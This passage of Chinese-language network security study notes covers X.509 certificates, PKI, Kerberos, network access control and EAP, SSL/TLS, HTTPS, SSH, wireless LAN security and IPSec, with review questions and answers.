title="证书"></a>证书</h4><p>包含以下要素：</p><ul><li>版本</li><li>序列号：此值在发放证书的CA中唯一</li><li>签名算法标识符</li><li>发放者名称</li><li>有效期</li><li>主体名称</li><li>主体公钥信息</li><li>发放者唯一标识符</li><li>扩展</li><li>签名</li></ul><p>每个CA的目录入口都包含如下两种类型的证书：</p><ul><li>前向证书：由其他CA生成的X的证书</li><li>反向证书：由X生成的其他CA的证书</li></ul><p>一个例子：</p><p><img src="/images/x509-0.png"></p><p><strong>证书撤销：</strong></p><p>每个证书都有一个有效期，在典型情况下，一个新的证书恰好在老证书过期前发放。有时候会被提前撤销，比如：</p><ul><li>用户的私钥被认为已经泄露</li><li>用户不再被CA信任</li><li>CA的证书被认为已经泄露</li></ul><h4 id="X-509版本3"><a href="#X-509版本3" class="headerlink" title="X.509版本3"></a>X.509版本3</h4><p>版本3包含了许多可以附加在版本2格式中的可选扩展，每个扩展包括一个扩展标识，一个危险指示符和一个扩展值。危险指示符用来指示一个扩展是否可以被安全的忽略。</p><p>证书扩展可分为下面三个主要类型：</p><ul><li>密钥和策略信息：证书策略是一个命名的规则集合，被用来只是证书对一个特定的具有相同安全需求的团体或者应用类别的适用性</li><li>证书主体和证书发放者属性：可以传递关于证书主体的额外信息</li><li>认证路径约束：这些扩展允许在CA发放给CA的证书中包括约束规定，这些约束可能会限制主体CA可以发放的证书类型。</li></ul><h3 id="公钥基础设施"><a href="#公钥基础设施" class="headerlink" title="公钥基础设施"></a>公钥基础设施</h3><p>PKIX模型中各个主要要素的相互关系：</p><ul><li>端实体</li><li>认证中心CA</li><li>注册中心RA</li><li>CRL发放者：可以代理CA发布CRL</li><li>存储库</li></ul><p><img src="/images/pkix.png"></p><h3 id="问题思考"><a href="#问题思考" class="headerlink" title="问题思考"></a>问题思考</h3><p>1.密钥发送给通信双方的方法？</p><ul><li>A选择一把钥匙并将其交给B</li><li>第三方选择密钥交给AB</li><li>如果AB最近使用过密钥，一方可以将新密钥传输给另一方，使用旧密钥加密</li><li>如果AB都与第三方C有加密连接，C可以将加密链接上的密钥传递给AB</li></ul><p>2.会话密钥与主密钥的区别？</p><p>会话密钥是两个主体之间使用的临时的加密密钥。主密钥是密钥分发中心和主体之间用于编码绘画密钥传输的主体密钥。</p><p>3.什么是密钥分发中心？</p><p>密钥分发中心是向授权主体发送临时会话密钥的系统。使用密钥分发中心与目标主体共享的主密钥，以加密的形式传递每个会话密钥。</p><p>4.一个提供全套Kerberos服务环境由哪些实体组成？</p><p>Kerberos服务器、多个客户端、多个应用服务器</p><p>5.在Kerberos环境下，域指的是什么？</p><p>域是一个环境，其中：1.Kerberos服务器必须具有其数据库中所有参与用户的用户ID和密码。所有用户都在Kerberos服务器上注册。2.Kerberos服务器必须与每个服务器共享一个密钥。所有服务器都在Kerberos服务器上注册</p><h2 id="网络访问控制和云安全"><a href="#网络访问控制和云安全" class="headerlink" title="网络访问控制和云安全"></a>网络访问控制和云安全</h2><h3 id="网络访问控制"><a href="#网络访问控制" class="headerlink" title="网络访问控制"></a>网络访问控制</h3><h4 id="网络访问控制系统组成元素"><a href="#网络访问控制系统组成元素" class="headerlink" title="网络访问控制系统组成元素"></a>网络访问控制系统组成元素</h4><ul><li>访问请求者AR</li><li>策略服务器</li><li>网络访问服务器NAS：远程用户系统想连接公司内网的时候，NAS起到一个访问控制点的作用</li></ul><h4 id="网络访问强制措施"><a href="#网络访问强制措施" class="headerlink" title="网络访问强制措施"></a>网络访问强制措施</h4><p>常用的NAC强制措施：</p><ul><li>IEEE 802.1X ：链路层协议，在一个端口被分配ip之前必须进行强制认证</li><li>虚拟局域网VLAN：在这种方法中，由互联的局域网组成的企业网络被逻辑化分为许多VLAN，NAC系统根据设备是否需要安全修复，是否只是访问互联网，对企业资源何种级别的访问，决定将网络中哪一个虚拟局域网分配给AR。</li><li>防火墙</li><li>动态主机配置协议DHCP管理</li></ul><h3 id="可扩展认证协议"><a href="#可扩展认证协议" class="headerlink" title="可扩展认证协议"></a>可扩展认证协议</h3><p>EAP（Extensible Authentication Protocol）为可扩展身份验证协议，是一系列验证方式的集合，设计理念是满足任何链路层的身份验证需求，支持多种链路层认证方式。EAP协议是IEEE 802.1x认证机制的核心，它将实现细节交由附属的EAP Method协议完成，如何选取EAP method由认证系统特征决定。这样实现了EAP的扩展性及灵活性，EAP可以提供不同的方法分别支持PPP，以太网、无线局域网的链路验证。</p><p><img src="/%5Cimages%5CEAP.png"></p><h4 id="认证方法"><a href="#认证方法" class="headerlink" title="认证方法"></a>认证方法</h4><p>EAP支持多种认证方法，这也是EAP被称为可扩展的原因。EAP为客户端系统与认证服务器之间交换信息提供了一种专用传输服务。下面是一些常用的支持EAP的方法：</p><ul><li>EAP-TLS EAP传输层安全</li><li>EAP-TTLS EAP隧道传输层安全</li><li>EAP-GPSK EAP统用预共享密钥</li><li>EAP-IKEv2</li></ul><h3 id="IEEE-802-1X基于端口的网络访问控制"><a href="#IEEE-802-1X基于端口的网络访问控制" class="headerlink" title="IEEE 802.1X基于端口的网络访问控制"></a>IEEE 802.1X基于端口的网络访问控制</h3><p>如图所示，802.1X 使用了受控端口与未受控端口的概念。端口是在认证者之间定义的逻辑实体，可以参照物理网络连接的概念。每一个逻辑端口被映射到两种类型的物理端口中的某-种。未受控端口会忽略请求者的认证状态，允许在请求者以及认证服务器之间交换协议数据单元。受控端口只有在当前请求者被授权允许进行交换时，才可以在请求者与网络上的其他系统间交换协议数据单元。</p><p><img src="/%5Cimages%5Cieee802.1x.png"></p><p>在802.1X中主要定义了EAPOL协议(局域网上的可扩展认证协议)。EAPOL协议作用在网络层上，使用了IEEE 802标准的局域网，如数据链路层上的以太网，Wi-Fi等。 为了进行认证，EAPOL允许请求者与认证者之间互相通信，以及两者之间进行EAP包的交换。</p><p><img src="/%5Cimages%5Ceapol.png"></p><p><img src="/%5Cimages%5Ceapolflame.png"></p><h3 id="云计算"><a href="#云计算" class="headerlink" title="云计算"></a>云计算</h3><h4 id="云计算组成元素"><a href="#云计算组成元素" class="headerlink" title="云计算组成元素"></a>云计算组成元素</h4><p>云计算：云计算是一种能够通过网络以便利的、按需付费的方式获取计算资源（包括网络、服务器、存储、应用和服务等）并提高其可用性的模式，这些资源来自一个共享的、可配置的资源池，并且能够以最省力和无人干预的方式获取和释放。云模型由5个基本特征、3个服务模型和4个部署模型组成。</p><p><strong>基本特征：</strong></p><ul><li>广泛的网络访问</li><li>快速的可伸缩性</li><li>可度量的服务</li><li>按需自助服务</li><li>资源共享</li></ul><p><strong>三种服务模型：</strong></p><ul><li>软件即服务SaaS</li><li>平台即服务PaaS</li><li>基础设施即服务IaaS</li></ul><p><strong>四种部署模型：</strong></p><p>公有云、私有云、社区云、混合云</p><h2 id="传输层安全"><a href="#传输层安全" class="headerlink" title="传输层安全"></a>传输层安全</h2><h3 id="Web安全需求"><a href="#Web安全需求" class="headerlink" title="Web安全需求"></a>Web安全需求</h3><h4 id="Web安全威胁"><a href="#Web安全威胁" class="headerlink" title="Web安全威胁"></a>Web安全威胁</h4><p><img src="/%5Cimages%5Cwebsec.png"></p><h4 id="Web流量安全方法"><a href="#Web流量安全方法" class="headerlink" title="Web流量安全方法"></a>Web流量安全方法</h4><p>1.使用IPSec。它对终端用户和应用是透明的，具有过滤功能，使得只用IPSec处理所选流量。</p><p>2.仅在TCP上实现安全，最典型的例子就是安全套接字层SSL和被称为第二代互联网安全标准TLS</p><p>3.特定安全服务在特定的应用中得以体现，比如Kerberos</p><h3 id="安全套接字层和传输层安全"><a href="#安全套接字层和传输层安全" class="headerlink" title="安全套接字层和传输层安全"></a>安全套接字层和传输层安全</h3><h4 id="SSL体系结构"><a href="#SSL体系结构" class="headerlink" title="SSL体系结构"></a>SSL体系结构</h4><p>SSL（安全套接字层）使用TCP提供一种可靠的端对端的安全服务。SSL不是单个协议，它由两层协议组成，如图6.2所示。SSL记录协议对各种更高层协议提供基本的安全服务。</p><p><img src="/%5Cimages%5Cssl.png"></p><p>SSL协议中最重要的两个概念是SSL会话和SSL连接，按照规范文件，他们的定义如下：</p><ul><li>连接：连接是一种能够提供合适服务类型的传输。对SSL来说，这种连接是点对点的关系而且都是短暂的。每一条连接都与一个会话相关联。</li><li>会话：SSL会话是客户与服务器之间的一种关联。会话是通过握手协议来创建的。所有会话都定义了密码安全参数集合，这些参数可以在多个安全连接之间共享。会话通常来减少每次连接建立安全参数的昂贵协商花费。</li></ul><h4 id="SSL记录协议"><a href="#SSL记录协议" class="headerlink" title="SSL记录协议"></a>SSL记录协议</h4><p>SSL记录协议为SSL连接提供如下两种服务。</p><ul><li>机密性：握手协议定义一个可用于加密SSL载荷的传统加密共享密钥</li><li>消息完整性：握手协议还定义一个用于产生消息认证码（MAC）的共享密钥</li></ul><p>SSL记录协议的运行流程：</p><p><img src="/%5Cimages%5Csslrec.png"></p><h4 id="修改密码规格协议"><a href="#修改密码规格协议" class="headerlink" title="修改密码规格协议"></a>修改密码规格协议</h4><p>修改密码规格协议是应用SSL记录协议的3个SSL规格协议之一,也是最简单的一个协议。本协议只包含一条消息(见图6.5 (a))， 由一个值为1的字节组成。这条消息的唯功能是使得挂起状态改变为当前状态，用于更新此连接使用的密码套件。</p><p><img src="/%5Cimages%5Csslrecpayload.png"></p><h4 id="警报协议"><a href="#警报协议" class="headerlink" title="警报协议"></a>警报协议</h4><p>警报协议用于将与SSL相关的警报传达给对等实体。与使用SSL的其他应用一样，警报消息也要按照当前状态的规格进行压缩和加密操作。</p><p>这一协议过程中的每一条消息都由两个字节组成。其中第一个字 节可以取值为警告(1)或致命(2)以表示消息的严重程度。如果严重程度为致命，SSL 将立即结束当前连接。虽然该会话中的其他连接还可以继续进行，但是本次会话不允许建立新的连接。第二个字节包括一种用于指明具体警告的编码。</p><h4 id="握手协议"><a href="#握手协议" class="headerlink" title="握手协议"></a>握手协议</h4><p>SSL最复杂的部分是握手协议。这一协议允许客户端和服务器相互认证，并协商加密和mac算法，以及用于数据保护使用的密钥通过SSL记录传送。握手协议在任何应用数据被传输之前使用。</p><p><img src="/%5Cimages%5Chandshake.png"></p><p>四个阶段：</p><ol><li>客户端发起建立连接请求</li><li>服务器认证和密钥交换</li><li>客户端认证和密钥交换</li><li>完成</li></ol><h4 id="密码计算"><a href="#密码计算" class="headerlink" title="密码计算"></a>密码计算</h4><p>主要关注以下两个问题：</p><ul><li>通过密钥交换创建一个共享主密钥</li><li>从共享主密钥中产生密码参数</li></ul><p>主密钥的创建：共享主密钥是通过安全密钥交换方式为本次会话创建的一一个一次性48字节(384比特)的值。创建过程分两步完成。第一步，交换预备主密钥。第二步，双方计算主密钥。</p><p>密码参数产生：密码规格要求客户端写MAC值的密钥、服务器写MAC值密钥、客户端写密钥、服务器写密钥、客户端写初始向量IV、服务器写初始向量IV，这些都是按顺序由主密钥产生的。其方法是主密钥利用散列函数来产生安全字节序列，字节序列足够长以便生成所有需要的参数。</p><h3 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h3><p>HTTPS是指用HTTP和SSL的结合来实现网络浏览器和服务器之间的安全通信。</p><p>标准http使用80端口，https使用443端口</p><h4 id="连接的初始化"><a href="#连接的初始化" class="headerlink" title="连接的初始化"></a>连接的初始化</h4><p>​    用户在合适的端口向服务器发起一个连接,然后发送TLS ClientHello,开始TLS信号交换。当TLS信号交换完毕后，用户将发起第一次HTTP请求。所有HTTP数据都要以TLS应用数据形式发送。然后是包括保持连接在内的传统HTTP操作。</p><h4 id="连接关闭"><a href="#连接关闭" class="headerlink" title="连接关闭"></a>连接关闭</h4><p>一个HTTP用户或者服务器可以通过在HTTP记录中加入“connection: close”的字样来指示一个连接的关闭。这意味着该连接将会在该条记录传输之后关闭。</p><p>关闭一个HTTPS连接要求关闭TLS与其对应的远程终端之间的连接，这要求关闭潜在的TCP连接。在TLS层，关闭一个连接的适当做法是两端都是用TLS警报通信协议发出一个“close notify” 警告。TLS实例必须在关闭连接之前发起一个关闭警报的交换。在发出一个关闭警告后，一个TLS实例会关闭这个连接，而不会等待它的另一端发来关闭警告，这造成了一个“不完整的关闭”。如果一个用户这么做了，可能是为了之后再次使用该会话。这只有在这个应用层知道(通常是通过检查HTTP消息边界)它接收了所有它关心的数据之后才可以完成。</p><h3 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h3><p>SSH由三个通信协议组织而成，通常运行在TCP之上：</p><ul><li><strong>传输层协议</strong>:提供服务器身份验证、数据保密性、带前向安全的数据完整性(比如，如果一个密钥在-一个会话期中泄密，这个消息不会影响之前会话期的安全)。传输层会有选择地提供压缩。</li><li><strong>用户身份验证协议</strong>:验证服务器的用户。</li><li><strong>连接协议</strong>:在一个单一、基础的SSH连接上复用多个逻辑的通信信道。</li></ul><h4 id="传输层协议"><a href="#传输层协议" class="headerlink" title="传输层协议"></a>传输层协议</h4><p><strong>主机密钥：</strong>服务器认证发生在传输层，基于拥有-对公共&#x2F;私有密钥的服务器。一个服务器会有多个主机密钥运用多重不同的非对称加密算法。多个主机会公用一个主机密钥。在任何情况下，服务器的主机密钥在密钥交换时被用来确认主机的身份。为了使这成为可能，用户必须掌握有关服务器的公共主机密钥的先验知识。</p><h4 id="分组交换"><a href="#分组交换" class="headerlink" title="分组交换"></a>分组交换</h4><p><img src="/%5Cimages%5Csshfenzu.png"></p><p><img src="/%5Cimages%5Csshchuanshu.png"></p><h4 id="用户身份认证协议"><a href="#用户身份认证协议" class="headerlink" title="用户身份认证协议"></a>用户身份认证协议</h4><p>用户身份认证协议提供用户向服务器证明自己身份的方法。</p><p>身份认证方式：</p><ul><li>公开密钥</li><li>口令密码</li><li>基于主机</li></ul><h4 id="连接协议"><a href="#连接协议" class="headerlink" title="连接协议"></a>连接协议</h4><p>SSH连接协议在SSH传输层协议之上运行，并假设使用了安全的认证连接。安全的认证连接是指连接协议用一个通道虚拟出多条逻辑信道。</p><p><strong>信道机制：</strong>所有使用SSH的通信类型，例如一个终端会话，都由不同的信道支持。双方中的任意一方都可能开启一个信道。对于每个信道，每一方都有一个独一无二的信道序列号，两方的序列号不用一致。 信道是通过一个窗口机制进行流量控制的。只有当接收的信息指明有窗口空间时，才可能有数据发送到信道。</p><p>信道的生命周期有三个阶段：开启信道、数据传送和关闭信道。</p><p>信道类型：</p><ul><li>会话</li><li>X11</li><li>前向tcpip</li><li>直接tcpip</li></ul><p><strong>端口转发：</strong>SSH最有用的特征之一就是端口转发。本质上来说，端口转发能够将任何不安全的TCP连接转换成安全的SSH连接。这也称为SSH隧道技术。我们需要知道在这种环境下端口的含义。一个端口是一个TCP用户的标识符。所以，任何运行在TCP上的应用程序都具有一个端口号。基于该端口号，TCP链路向合适的应用程序发送数据。一个应用程序可能使用多个端口号。比如，简单邮件传输协议(SMTP)，服务器端通常会在端口25监听，所以一个SMTP请求需要使用TCP并使数据到达目的端口25。TCP辨别这是SMTP服务器地址，同时发送数据到SMTP服务器应用程序。</p><p><img src="/%5Cimages%5Csshsuidao.png"></p><h3 id="问题思考-1"><a href="#问题思考-1" class="headerlink" title="问题思考"></a>问题思考</h3><p>1.SSL有哪些协议组成？</p><p>SSL更改密码规范协议，SSL警报协议，SSL记录协议</p><p>2.SSL会话和连接的区别？</p><p>对于SSL来说，连接是临时的，每个连接都与一个会话关联。会话是客户机和服务器之间的关联，会话是由握手协议创建。会话会定义一组加密安全参数，这些参数可以在多个连接之间共享，会话的作用是为了避免为每个连接进行昂贵的新安全参数协商。</p><h2 id="无线网络安全"><a href="#无线网络安全" class="headerlink" title="无线网络安全"></a>无线网络安全</h2><h3 id="无线安全"><a href="#无线安全" class="headerlink" title="无线安全"></a>无线安全</h3><p>威胁无线网络安全的关键因素列举如下：</p><ul><li>信道：与有线网络相比，更易受监听和干扰的影响</li><li>移动性：无线设备相较于有线设备更具有移动性和便捷性，造成很多安全隐患</li><li>资源：一些无线设备，具有复杂的操作系统，但是只有有限的存储空间和资源供我们抵抗诸如拒绝服务和恶意软件的攻击</li><li>易接近性：一些无线设备经常会被单独放在遥远的或者地方的环境中，这大大增加了它们收到物理攻击的可能性</li></ul><h4 id="无线网络安全威胁"><a href="#无线网络安全威胁" class="headerlink" title="无线网络安全威胁"></a>无线网络安全威胁</h4><p>无线网络的安全威胁：</p><ul><li>偶然连接：相邻的公司无线局域网或连接到有线局域网的无线接入点之间，可能会产生互相重叠的传送区间。当一个用户想要连接到一个局域网之中时，会无意中被锁定在相邻的无线接入点。尽管安全缺口时偶然出现的，但是它足以将这个局域网的资源暴露给一个偶然闯入的用户。</li><li>恶意连接：在这种情况下，一个无线设备被配置伪装成了一个合法的接入点，使得攻击者可以从合法用户那里盗取密码，然后再使用盗取的密码侵入合法接入点。</li><li>Ad hoc网络：Ad hoc网络:这种网络是不包含接入点的、无线计算机之间的、对等方式的网络。由于没有中心点的控制，这种网络可能存在安全隐患。</li><li>非传统型网络：非传统型网络和链接，如个人网络蓝牙设备、条形码识别器和手持型PDA，面临着被监听和欺诈的安全隐患。</li><li>身份盗窃（MAC欺诈）：身份盗窃(MAC欺诈):这种威胁发生在攻击者可以通过网络权限监听网络信息流<br>通量，并认证计算机的MAC地址的时候。</li><li>中间人攻击</li><li>拒绝服务</li><li>网络注入：网络注入攻击的目标是暴露于未过滤的网络信息流之中的无线接入点，例如路由选择协议信息或网络管理信息。实现这种攻击的一个例子是，使用伪造的重配置命令，来影响路由器和交换机，从而降低网络性能。</li></ul><h4 id="无线安全措施"><a href="#无线安全措施" class="headerlink" title="无线安全措施"></a>无线安全措施</h4><p><strong>安全无线传输：</strong></p><ul><li>信息隐藏技术：组织很多手段可以使得攻击者定位无线接入点变得更难，包括取消广播服务，设置初始化校验器SSID，给SSID分配加密的名称，保证提供必要覆盖率的情况下，将信号强度降到最低水平，使用定向天线</li><li>加密</li></ul><p><strong>安全的无线接入点：</strong>802.1X</p><p><strong>安全的无线网络：</strong></p><ul><li>使用加密手段</li><li>使用防火墙</li><li>关闭标识符广播</li><li>改变默认标识符</li><li>改变路由器的预设密码</li><li>只允许专用的计算机访问无线网络</li></ul><h3 id="IEEE-802-11无线局域网概述"><a href="#IEEE-802-11无线局域网概述" class="headerlink" title="IEEE 802.11无线局域网概述"></a>IEEE 802.11无线局域网概述</h3><p>关键术语：</p><p><img src="/%5Cimages%5C80211shuyu.png"></p><h4 id="IEEE802协议架构"><a href="#IEEE802协议架构" class="headerlink" title="IEEE802协议架构"></a>IEEE802协议架构</h4><p><strong>物理层：</strong>最底层就是物理层，该层的功能包括信号的加密和解密，比特流的传输和接收，对于802.11，物理层还定义了频率范围和天线特性。</p><p><strong>媒体访问控制MAC：</strong>所有局域网都包含有共享网络传输容量的设施，就有需要一些方法来控制传输介质的接口，以便使这些容量能够得到有序高效的应用。功能主要有：</p><ul><li>传输时将数据组装成帧</li><li>接收时，将帧拆开，并进行地址确认和错误检测</li><li>控制局域网传输介质的接口</li></ul><p><strong>逻辑链路控制LLC：</strong>在大多数的数据链路控制协议中，数据链路协议不仅利用CRC来进行错误检测，而且利用重传的损坏的数据帧进行恢复。MAC负责检测错误并丢弃包含错误的帧，LLC层可选择地追踪成功接收的帧或者重传不成功的帧。</p><h4 id="IEEE-802-11网络组成与架构模型"><a href="#IEEE-802-11网络组成与架构模型" class="headerlink" title="IEEE 802.11网络组成与架构模型"></a>IEEE 802.11网络组成与架构模型</h4><p>一个无线局域网最小的组成块是<strong>基本服务单元(BSS)<strong>， 包含执行相同</strong>MAC</strong>协议和竞争同一无线介质接口的多个无线站点。一个BSS可能是独立的，也可能是通过**访问接入点(AP)<strong>链接到</strong>分布式系统(DS)**。 访问接入点具有桥梁和中继作用。在一个基本服务单元中，同一基本服务单元中的用户站点不直接进行相互通信，来自初始站点的数据帧先发送到访问接入点，然后从访问接入点发送到目的站点。而从一个基本服务单元的站点到一个遥远站点发送帧，先由该站点到访问接入点，然后通过访问接入点中继到分配系统，最终到达目的站点。基本服务单元可以看成一个细<br>胞，而分配系统可以是交换机、有线网络，也可以是无线网络。</p><p>若一个基本服务单元BSS中的站点都是移动站点，并且相互之间能够通信而不用通过访问接入点，则该基本服务单元BSS称为**独立基本服务单元(IBSS)<strong>。 独立基本服务单元是一个典型的点对点模式的网络。在独立基本服务单中，所有站点直接通信，没有访问接入点涉入其中。</strong>一个扩展服务单元(ESS)**包含两个或多个通过分配系统相连的基本服务单元。而对于逻辑链路控制层来说,扩展服务单元对该逻辑链路控制层相当于一个单一的逻辑局域网。</p><h3 id="IEEE-802-11i-无线局域网安全"><a href="#IEEE-802-11i-无线局域网安全" class="headerlink" title="IEEE 802.11i 无线局域网安全"></a>IEEE 802.11i 无线局域网安全</h3><h4 id="IEEE-802-11i服务"><a href="#IEEE-802-11i服务" class="headerlink" title="IEEE 802.11i服务"></a>IEEE 802.11i服务</h4><p>802.11i的RSN安全规范定义了以下几种服务。</p><ul><li>认证:一种定义了用户和认证服务器之间交换的协议，能够相互认证，并产生暂时密钥用于通过无线连接的用户和访问接入点之间。</li><li>访问控制: 该功能迫使认证功能的使用，合理安排信息，帮助密钥交换，能够在一系列的认证协议下工作。</li><li>信号完整性加密: MAC层数据(例如，LLC协议数据单元)与信号完整性字段一起加密，以确保数据没有被篡改。</li></ul><h4 id="IEEE-802-11i操作阶段"><a href="#IEEE-802-11i操作阶段" class="headerlink" title="IEEE 802.11i操作阶段"></a>IEEE 802.11i操作阶段</h4><p>5个操作阶段：</p><ul><li>发现:访问接入点使用信标和探测响应信息来发布其IEEE 802.11i安全策略。站点则通过这些来确认希望进行通信的无线局域网访问接入点的身份。站点连接访问接入点，当信标和探测响应提供选择时，选择加密套件和认证机制。</li><li>认证:在本阶段，站点和认证服务器相互证明各自的身份。访问接入点阻止站点和认证服务器之间直到认证成功之前尚未被认证的传输。访问接入点不参与认证，参与认证的是转发站点和认证服务器之间的数据传输。</li><li>密钥的产生及配送: 访问接入点和站点执行几种操作之后产生加密密钥，并配送到访问接入点和站点。数据帧只在访问接入点和站点之间进行交换。</li><li>保密数据传输:数据帧在站点和终端站点之间通过访问接入点进行交换。安全数据传输只发生在站点和访问接入点之间，而不能确保端到端的安全。</li><li>连接终止:访问接入点和站点交换数据帧。在本阶段，安全连接被解除，连接恢复到初始状态。</li></ul><p><img src="/%5Cimages%5Cieee80211i.png"></p><h4 id="发现阶段"><a href="#发现阶段" class="headerlink" title="发现阶段"></a>发现阶段</h4><p>该阶段功能是站点和网络接入点相互确认身份，协商一系列安全策略，并建立连接一边将来进行通信。</p><p>MPDU交换：包含三个交换：</p><ul><li>网络和安全通道的发现</li><li>开放系统认证</li><li>连接</li></ul><h3 id="思考题"><a href="#思考题" class="headerlink" title="思考题"></a>思考题</h3><p>1.什么是802.11 WLAN的基本构建块？</p><p>基本服务集BSS。</p><p>2.什么是扩展服务集？</p><p>由一个配电系统互连的两个或者多个基本服务集。</p><h2 id="IP安全"><a href="#IP安全" class="headerlink" title="IP安全"></a>IP安全</h2><h3 id="IP安全概述"><a href="#IP安全概述" class="headerlink" title="IP安全概述"></a>IP安全概述</h3><h4 id="IPSec的应用"><a href="#IPSec的应用" class="headerlink" title="IPSec的应用"></a>IPSec的应用</h4><p>IPSec提供了在LAN、专用和公用WAN以及互联网中安全通信的性能，它的用途包括如下方面：</p><ul><li>通过互联网安全分支机构接入</li><li>通过互联网进行安全远程访问</li><li>与合作者建立企业间联网和企业内联网接入</li><li>加强电子商务安全性</li></ul><h4 id="IPSec的好处"><a href="#IPSec的好处" class="headerlink" title="IPSec的好处"></a>IPSec的好处</h4><p><img src="/%5Cimages%5Cipsec1.png"></p><ul><li>当路由器或者防火墙中使用IPSec时，它对通过其边界的所有通信流提供了强安全性。</li><li>防火墙内IPSec能在所有的外部流量必须使用IP时阻止旁路，因为防火墙是从互联网进入组织内部的唯一通道。</li><li>IPSec位于传输层（TCP、UDP）之下，所以对所有的应用都是透明的</li><li>IPSec可以对终端用户透明</li><li>若有必要，IPSec可以对个人用户提供安全性</li></ul><h4 id="路由应用"><a href="#路由应用" class="headerlink" title="路由应用"></a>路由应用</h4><p>除了支持终端用户和保护上述系统及网络外，IPSec在互联网结构中扮演者非常重要的角色，IPSec可确保：</p><ul><li>路由器广播（新的路由器公告它的存在）来自授权的路由器</li><li>邻居广播（路由器试图建立或者维护与其他路由区域中路由器的邻居关系）来自授权服务器</li><li>重定向报文，它来自被发送给初始包的路由器</li><li>路由更新未被伪造</li></ul><h4 id="IPSec服务"><a href="#IPSec服务" class="headerlink" title="IPSec服务"></a>IPSec服务</h4><ul><li>访问控制</li><li>无连接完整性</li><li>数据源认证</li><li>拒绝重放包</li><li>保密性</li><li>受限制的流量保密性</li></ul><h4 id="传输模式和隧道模式"><a href="#传输模式和隧道模式" class="headerlink" title="传输模式和隧道模式"></a>传输模式和隧道模式</h4><p><strong>传输模式：</strong>传输模式主要为上层协议提供保护。也就是说，传输模式保护增强了对IP包载荷的保护，如对TCP段、UDP段或ICMP包的保护(这些均直接运行在主机协议栈的IP之上)。一般地，传输模式用于在两个主机(如客户端和服务器、两个工作站)之间进行端对端的通信。当主机在IPv4上运行AH或ESP时，其载荷通常是接在IP报头后面的数据。对于IPv6而言，其载荷通常是接在IP报头后面的数据和任何存在的IPv6扩展报头，其中可能会把目的选项报头除外，因为它可能在保护状态下。<br>传输模式下的ESP加密和认证(认证可选) IP载荷，但不包括IP报头。传输模式的AH认证IP载荷和IP报头的选中部分。</p><p><strong>隧道模式：</strong> 隧道模式对整个IP 包提供保护。为了达到这个目的，在把AH或者ESP域添加到IP包中后，整个包加上安全域被作为带有新外部IP报头的新“外部”IP包的载荷。整个原始的或者说是内部的包在“隧道”上从IP网络中的一一个节点传输到另一个节点，沿途的路由器不能检查内部的IP报头。因为原始的包被封装，新的更大的包有完全不同的源地址和目的地址，因此增加了安全性。隧道模式被使用在当SA的一端或者两端为安全网关时，比如使用IPSec的防火墙和路由器。在传输模式下，即使不使用IPSec,位于防火墙后的主机间也可能进行安全通信。这种主机产生的未受保护的包借助隧道模式SA穿越外部网络，隧道模式SA是由防火墙中的IPSec 软件或本地网络边缘的安全路由器建立的。</p><p><img src="/%5Cimages%5Cahesp.png"></p><h3 id="IP安全策略"><a href="#IP安全策略" class="headerlink" title="IP安全策略"></a>IP安全策略</h3><h4 id="安全关联"><a href="#安全关联" class="headerlink" title="安全关联"></a>安全关联</h4><p>IPSec操作的基础是应用于每个由源地址到目的地址传输中IP包安全策略的概念。IPSec安全策略本质上由两个交互的数据库，<strong>安全关联数据库SAD</strong>（定义与每个SA相关的安全参数）和<strong>安全策略数据库SPD</strong>（IP流量与特定SA相关联的方法）确定，对应关系如下：</p><p><img src="/%5Cimages%5Cipsec2.png"></p><p>在IP认证和加密机制中都会出现的一个重要的概念就是安全关联SA。安全关联是发送端和接收端之间用于对它们之间传递的数据流提供安全服务的一个单向逻辑连接。一个安全关联由如下三个参数唯一确定：</p><ul><li>安全参数索引SPI</li><li>IP目的地址</li><li>安全协议标识</li></ul><h4 id="IP通信进程"><a href="#IP通信进程" class="headerlink" title="IP通信进程"></a>IP通信进程</h4><p>IPSec是在报文到报文的基础上进行的。当IPSec执行时，发往外部的包在传送前经过IPSec处理，而发往内部的包在接收之后并且在发送报文内容到更高层之前经过IPSec处理。</p><p><strong>出站报文：</strong></p><p>(1)  IPSec 查询SPD对该报文寻找匹配。<br>(2) 如果没有匹配，报文被丢弃并生成错误信息。<br>(3) 如果发现匹配，则进一步的处理由SPD中的第-一个匹配接口决定。如果对该报文的策略是丢弃，则该报文被丢弃。如果策略是通过，则没有进一步的IPSec 处理:报文传向网络以便发送。<br>(4) 如果策略是保护，则查询SAD来寻找匹配接口。如果没有发现接口，则引入IKE 生成具有合适密钥的SA，并在SA上产生接口。<br>(5) SA上的匹配接口决定报文的进一步处理。对报文加密或者认证，或者两者都被执行，并且既可以使用传输模式，也可以使用隧道模式。报文传向网络以便发送。</p><p><strong>入站报文：</strong></p><p>(1)通过检测IP协议域(IPv4)或者下一个头域(IPv6)， IPSec决定这是一个不安全的IP包，还是一个有ESP或者AH头&#x2F;尾的报文。<br>(2)如果报文不安全，IPSec 查询SPD为该报文寻找匹配。如果第一个匹配接口的策略是通过，则IP头经过处理后被剥离，而IP数据体传输到更高层(如TCP)。如果第一个匹配接口的策略是保护或者丢弃，或者没有匹配接口，则报文被丢弃。<br>(3)对于安全报文，IPSec查询SAD。如果没有匹配，报文被丢弃。否则，IPSec使用合理的ESP或者AH进程。然后IP头经过处理后被剥离，而IP数据体传输到更高层(如TCP)。</p><h3 id="封装安全载荷"><a href="#封装安全载荷" class="headerlink" title="封装安全载荷"></a>封装安全载荷</h3><h4 id="ESP格式"><a href="#ESP格式" class="headerlink" title="ESP格式"></a>ESP格式</h4><ul><li>安全参数索引</li><li>序列号</li><li>载荷数据</li><li>填充域</li><li>填充长度</li><li>邻接报头</li><li>完整性校验值</li></ul><p><img src="/%5Cimages%5Cesppacket.png"></p><h4 id="加密和认证算法"><a href="#加密和认证算法" class="headerlink" title="加密和认证算法"></a>加密和认证算法</h4><p>ESP服务加密载荷数据、填充域、填充长度和邻接报头域，如果用于加密载荷的算法需要使用密码同步数据，如初始向量IV，则这些数据可以在载荷数据域的开始处显式地传输。如果包括IV，它虽然会被看成密文的一部分，但是不会被加密。</p><p>ICV域是可选的，仅当选择了完整性服务且该服务由一个单独的完整性算法提供，或者由用于ICV的组合式算法提供时，该域才会出现。ICV的值是在加密完成后才会被计算。</p><h4 id="防止重放服务"><a href="#防止重放服务" class="headerlink" 